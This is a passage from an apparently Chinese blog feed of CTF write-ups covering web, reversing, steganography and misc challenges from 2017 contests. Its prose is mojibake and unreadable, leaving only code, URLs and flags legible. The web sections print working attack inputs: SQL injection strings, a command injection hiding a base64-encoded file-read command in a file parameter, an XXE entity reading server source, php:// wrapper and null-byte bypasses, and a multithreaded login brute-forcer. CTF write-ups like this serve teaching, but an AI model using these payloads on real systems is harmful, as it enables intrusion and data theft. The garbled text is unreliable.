<h2 id="æŸ¥è¯¢ip"><a href="#æŸ¥è¯¢ip" class="headerlink" title="æŸ¥è¯¢ip"></a>æŸ¥è¯¢ip</h2><p>å¤å­£é¢„èµ›çš„é¢˜ï¼Œç›´æ¥nslookup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxxxxx&gt;nslookup 107.182.177.34</span><br><span class="line">æœåŠ¡å™¨:  UnKnown</span><br><span class="line">Address:  172.16.0.1</span><br><span class="line"></span><br><span class="line">åç§°:    this-is-flag</span><br><span class="line">Address:  107.182.177.34</span><br></pre></td></tr></table></figure></p>
<h2 id="macå°±æ˜¯å¥½ç”¨"><a href="#macå°±æ˜¯å¥½ç”¨" class="headerlink" title="macå°±æ˜¯å¥½ç”¨"></a>macå°±æ˜¯å¥½ç”¨</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57013/" target="_blank" rel="noopener">http://118.178.18.181:57013/</a><br>ä¸‹è½½<code>http://118.178.18.181:57013/.DS_store</code>,catä¸€ä¸‹ï¼Œå‘ç°<code>s h o w m e f l a g . p h p</code>å­—æ ·<br>è®¿é—®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.18.181:57013&#x2F;showmeflag.php</span><br></pre></td></tr></table></figure><br>æ‹¿åˆ°flag</p>
<h2 id="äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´"><a href="#äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´" class="headerlink" title="äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´"></a>äººï¼Œæ‰æ˜¯æœ€å¤§çš„æ¼æ´</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://114.55.36.69:57012/" target="_blank" rel="noopener">http://114.55.36.69:57012/</a><br>ç»å…¸ç™»å½•æ¡†æ³¨å…¥ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;union select md5(1)#</span><br><span class="line">password&#x3D;1</span><br></pre></td></tr></table></figure><br>æ‹¿åˆ°flag</p>
<h2 id="sqlmapæ²¡æœ‰åµç”¨"><a href="#sqlmapæ²¡æœ‰åµç”¨" class="headerlink" title="sqlmapæ²¡æœ‰åµç”¨"></a>sqlmapæ²¡æœ‰åµç”¨</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57019/" target="_blank" rel="noopener">http://118.178.18.181:57019/</a><br>å³é”®æºä»£ç æç¤º<code>source.php</code>,unionå’Œfromå‰é¢åªèƒ½å­˜åœ¨å­—æ¯ï¼Œä¸èƒ½æœ‰ç©ºæ ¼ï¼Œæ„é€ <code>\N</code>ç»•è¿‡ï¼Œ(æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥åªæœ‰<code>\N</code>å¯ä»¥ï¼Œå°å†™nçš„ä¸è¡Œ)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\Nunion <span class="keyword">select</span> <span class="number">1</span>,flag, \Nfrom flag%<span class="number">23</span> </span><br><span class="line"> // \Nè¡¨ç¤ºå›è½¦ï¼Œåœ¨Linuxä¸­è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸã€‚</span><br></pre></td></tr></table></figure></p>
<h2 id="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€-1"><a href="#éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€-1" class="headerlink" title="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€"></a>éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57016/index.pl?file=test.txt" target="_blank" rel="noopener">http://118.178.18.181:57016/index.pl?file=test.txt</a><br>æ„é€ ä»£ç æ³¨å…¥ï¼Œè¿™é‡Œè¦æŠŠå«æœ‰flagçš„ç”¨base64ç¼–ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.18.181:57016&#x2F;index.pl?file&#x3D;test.txt| &#96;echo Y2F0IC92YXIvd3d3L2h0bWwvZmxhZy5wbA&#x3D;&#x3D;| base64 -d&#96;|</span><br></pre></td></tr></table></figure></p>
<h2 id="can-u-read-me-do-u-understand-me"><a href="#can-u-read-me-do-u-understand-me" class="headerlink" title="can u read me,do u understand me?"></a>can u read me,do u understand me?</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://114.55.36.69:57018/" target="_blank" rel="noopener">http://114.55.36.69:57018/</a><br>XXE,ç›´æ¥è¯»å–flag.phpï¼Œè¯»å–å‡ºæ¥çš„æºç æ˜¯phpjiamiè¿‡çš„ï¼Œå¯ä»¥å»èŠ±é’±è§£ä¹Ÿå¯ä»¥ç›´æ¥ç”¨å·¥å…·è§£<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE xdsec[</span><br><span class="line">&lt;!ELEMENT methodname ANY&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;name&gt;&amp;file;&lt;&#x2F;name&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›"><a href="#è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›" class="headerlink" title="è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›"></a>è¿˜è®°å¾—æ‰¾å›å¯†ç çš„åŠŸèƒ½å˜›</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://114.55.36.69:57014/" target="_blank" rel="noopener">http://114.55.36.69:57014/</a><br>ç»™äº†æºç <br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select 1,2,3,4 -- yourqq@qq.com</span><br></pre></td></tr></table></figure><br>è¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨äº†ç©ºæ ¼ä¼šè¢«åˆ†å‰²æˆå¤šä¸ªæ”¶ä»¶äºº</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…¶å®å°±æ˜¯æ…•æµ‹å®‰æ’æ¯&lt;br&gt;6æœˆ18æ—¥çš„å¤å­£é¢„èµ›çº¿ä¸Šèµ›ï¼Œ9æœˆ22æ—¥æ›´æ–°babysqlï¼Œ10æœˆ12æ—¥æ›´æ–°findpwdã€æœåŠ¡å‘ç°ã€babylogin&lt;br&gt;10æœˆ23æ›´æ–°ç§‹å­£é¢„èµ›é¢˜ç›®&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="æ–‡ä»¶åŒ…å«" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="ç¼–è¾‘å™¨æ³„éœ²" scheme="https://www.codemonster.cn/tags/%E7%BC%96%E8%BE%91%E5%99%A8%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>2017 ä¸–å®‰æ¯çº¿ä¸Šé¢„èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/10/2017-shianbei-ctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/10/2017-shianbei-ctf-writeup/</id>
    <published>2017-10-10T06:41:39.000Z</published>
    <updated>2018-05-04T07:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>emmmmmmmmï¼Œå…³äºæ¯”èµ›è´¨é‡é—®é¢˜ï¼Œå‡ºé—¨å·¦è½¬<a href="https://www.zhihu.com/question/66360616" target="_blank" rel="noopener">çŸ¥ä¹</a>ï¼Œå‡ºé—¨å³è½¬<a href="https://ctfrank.org/events/39" target="_blank" rel="noopener">ctfrank</a><br>æ˜¨å¤©ç«Ÿç„¶æ¥åˆ°äº†å†³èµ›é€šçŸ¥ç”µè¯ï¼Œè€ƒè™‘åˆ°å„ç§é—®é¢˜ï¼Œæœ€åè¿˜æ˜¯å¼ƒæƒäº†<br>ä»¥ä¸‹æ˜¯çº¿ä¸Šèµ›wp<br><a id="more"></a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ctfå…¥é—¨çº§é¢˜ç›®"><a href="#ctfå…¥é—¨çº§é¢˜ç›®" class="headerlink" title="ctfå…¥é—¨çº§é¢˜ç›®"></a>ctfå…¥é—¨çº§é¢˜ç›®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-rao&#x2F;</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®ç»™äº†æºä»£ç <code>index.phps</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'*********'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;section class="login"&gt;</span><br><span class="line">        &lt;div class="title"&gt;</span><br><span class="line">                &lt;a href=<span class="string">"./index.phps"</span>&gt;View Source&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> /&gt;&lt;br/&gt;</span><br><span class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/section&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨<code>%00</code>å¯ä»¥æˆªæ–­<code>ereg</code>ï¼Œæ„é€ <code>?password=1%00â€”</code><br><code>flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></p>
<h2 id="æ›²å¥‡"><a href="#æ›²å¥‡" class="headerlink" title="æ›²å¥‡"></a>æ›²å¥‡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-quqi&#x2F;index.php?line&#x3D;&amp;file&#x3D;a2V5LnR4dA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>fileå‚æ•°åé¢æ˜¯<code>base64ç¼–ç </code>çš„<code>key.txt</code>ï¼Œlineæ˜¯è¡Œæ•°<br>ç¼–å†™pyè„šæœ¬è¯»å–<code>index.php</code>æºç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by:xishir</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">r1=r.session()</span><br><span class="line">url=<span class="string">'http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&#123;0&#125;&amp;file=aW5kZXgucGhw'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	r2=r1.get(url.format(str(i)))</span><br><span class="line">	<span class="keyword">print</span> r</span><br></pre></td></tr></table></figure><br>è¯»å–åˆ°çš„index.phpå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;file=a2V5LnR4dA=="</span>);</span><br><span class="line"></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'key.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>]==<span class="string">'li_lr_480'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'thisis_flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°å½“cookieä¸­çš„<code>key</code>å€¼ä¸º<code>li_lr_480</code>ï¼Œå³å¯è¯»å–<code>thisis_flag.php</code>æ–‡ä»¶<br><img src="/img/2017-sab-web2.png" alt=""><br><code>flag{UHGgd3rfH*(3HFhuiEIWF}</code></p>
<h2 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-leixing&#x2F;</span><br></pre></td></tr></table></figure>
<p>ç»å…¸å¼±ç±»å‹é¢˜ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-leixing&#x2F;?x1&#x3D;0&amp;x2&#x3D;&#123;&#39;x21&#39;:&#39;2018a&#39;,&#39;x22&#39;:[[1],0]&#125;&amp;x3&#x3D;XIPU-&#x3D;3CS</span><br></pre></td></tr></table></figure><br>å…¶ä¸­<code>XIPU-=3CS</code>md5åŠ å¯†åçš„8åˆ°16ä½ä»¥0eå¼€å¤´ï¼Œå…¶ä»–å…¨æ˜¯æ•°å­—<br>ä¸‹é¢æ˜¯è·‘md5è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">b=<span class="string">'-=[],./;"1234567890abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(str1)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(str1).hexdigest()[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hashlib.md5(str1).hexdigest()[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">            <span class="keyword">if</span> i&gt;<span class="string">'9'</span>:</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> str1</span><br><span class="line">            input(<span class="string">"success"</span>)</span><br><span class="line">    <span class="keyword">if</span>(len(str1)&gt;<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">            find(str1+i)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    find(<span class="string">'XIPU'</span>)</span><br></pre></td></tr></table></figure><br><code>CTF{Php_1s_bstl4_1a}</code></p>
<h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-s&#x2F;</span><br></pre></td></tr></table></figure>
<p>æç¤ºå¯†ç <code>5ä½æ•°å­—</code>ï¼Œè·‘å¯†ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by:xishir</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ctf1.shiyanbar.com/shian-s/index.php'</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></span><br><span class="line">		super(MyThread, self).__init__()</span><br><span class="line">		self.arg = arg</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> site <span class="keyword">in</span> self.arg:</span><br><span class="line">			scan(site)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    	r1=r.session()</span><br><span class="line">        r3=r1.get(url)</span><br><span class="line">        ss=re.findall(<span class="string">r'type="text"&gt;&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;'</span>,r3.text)</span><br><span class="line">        url1=url+<span class="string">'?username=admin&amp;password='</span>+i+<span class="string">'&amp;randcode='</span>+ss[<span class="number">0</span>]</span><br><span class="line">        r2=r1.get(url1)</span><br><span class="line">        r2.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="comment">#print r2.text</span></span><br><span class="line">        <span class="keyword">if</span> len(r2.text)!=<span class="number">146</span>:</span><br><span class="line">        	<span class="keyword">print</span> r2.text,url1</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	thread_num=<span class="number">100</span></span><br><span class="line">	site = [[] * <span class="number">1005</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_num)]</span><br><span class="line">	threads = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">		j = i % thread_num</span><br><span class="line">		s = <span class="string">'%05d'</span> % i</span><br><span class="line">		site[j].append(s)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> site:</span><br><span class="line">		t = MyThread(i)</span><br><span class="line">		threads.append(t)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">		i.setDaemon(<span class="literal">True</span>)</span><br><span class="line">		i.start()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads: </span><br><span class="line">		i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure><br>è·‘å‡ºæ¥å¯†ç ä¸º<code>00325</code><br><code>flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-du&#x2F;</span><br></pre></td></tr></table></figure>
<p><code>phpä¼ªåè®®php://input</code>é€šè¿‡ç¬¬ä¸€ä¸ªif<br>å†åˆ©ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf1.shiyanbar.com&#x2F;shian-du&#x2F;?user&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><br>è¯»å–index.phpå’Œclass.phpæºç <br>æç¤ºflagåœ¨<code>f1a9.php</code>ä¸­ï¼Œf1a9è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯æ„é€ <code>ååºåˆ—åŒ–</code>å­—ç¬¦ä¸²è¯»å–flagï¼Œå¬è¯´å¤§ä½¬ä»¬ç”¨è¿™ä¸ªç›´æ¥è¯»å–äº†å…¶ä»–webé¢˜çš„flagï¼Œè†œ<br><img src="/img/2017-sab-web5.png" alt=""><br><code>flag_Xd{hSh_ctf:e@syt0g3t}</code> </p>
<h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><h2 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h2><p>PEIDæŸ¥å‡ºæ¥æ˜¯<code>C#</code>å†™çš„ï¼ŒILSpyåç¼–è¯‘å¾—åˆ°æºç <br><img src="/img/2017-sab-re1.png" alt=""><br>å°†ä»£ç å–å‡ºæ¥ç¼–è¯‘è¿è¡Œï¼Œè¾“å‡ºstring bå¾—åˆ°flag<br><code>flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>å‚è€ƒï¼š<br><a href="https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/" target="_blank" rel="noopener">https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/</a><br><code>TheseIntentsAreFunAndEasyToUse</code></p>
<h2 id="ç®€å•ç®—æ³•"><a href="#ç®€å•ç®—æ³•" class="headerlink" title="ç®€å•ç®—æ³•"></a>ç®€å•ç®—æ³•</h2><p>é˜Ÿå‹åšçš„</p>
<h1 id="éšå†™"><a href="#éšå†™" class="headerlink" title="éšå†™"></a>éšå†™</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>æŠŠbmpä¿å­˜ä¸º<code>png</code>ï¼ŒStegsolve.jaræ‰“å¼€ï¼Œæ‰«æäºŒç»´ç <br><img src="/img/2017-sab-ste1.png" alt=""><br><code>flag{139711e8e9ed545e}</code></p>
<h2 id="æ–‘é©¬æ–‘é©¬"><a href="#æ–‘é©¬æ–‘é©¬" class="headerlink" title="æ–‘é©¬æ–‘é©¬"></a>æ–‘é©¬æ–‘é©¬</h2><p>ç”¨pså¤„ç†ï¼Œæå–å‡º<code>æ¡å½¢ç </code>éƒ¨åˆ†ï¼Œç”¨qqæ‰«æå¾—åˆ°flag<br><img src="/img/2017-sab-ste2.png" alt=""><br><code>Tenshine</code></p>
<h2 id="CreateByWho"><a href="#CreateByWho" class="headerlink" title="CreateByWho"></a>CreateByWho</h2><p>æ‹¼äºŒç»´ç ï¼Œéœ€è¦è¡¥<code>ä¸‰å—å›å‹</code>çš„å—<br><img src="/img/2017-sab-ste3.png" alt=""><br><code>Create-By-SimpleLab</code></p>
<h2 id="é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡"><a href="#é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡" class="headerlink" title="é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡"></a>é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡</h2><p>Stegsolve.jaræ‰“å¼€ï¼Œæ‰«äºŒç»´ç ï¼Œä¿å­˜ä¸º<code>pyc</code>ï¼Œ<code>åç¼–è¯‘</code>åè¿è¡Œå¾—åˆ°flag<br><img src="/img/2017-sab-ste4.png" alt=""><br><code>flag{38a57032085441e7}</code></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>winhexæ‰“å¼€ååœ¨å°¾éƒ¨å‘ç°<code>photoshop</code>å­—æ ·ï¼Œä¸è¿‡æ˜¯å€’åºçš„ï¼Œå†™ä¸ªpyè„šæœ¬å€’åºä¿å­˜å¾—åˆ°å›¾ç‰‡ï¼Œå†ç”¨pså¤„ç†å¾—åˆ°flag<br><img src="/img/2017-sab-misc1.png" alt=""><br><code>flag{4f7548f93c7bef1dc6a0542cf04e796e}</code></p>
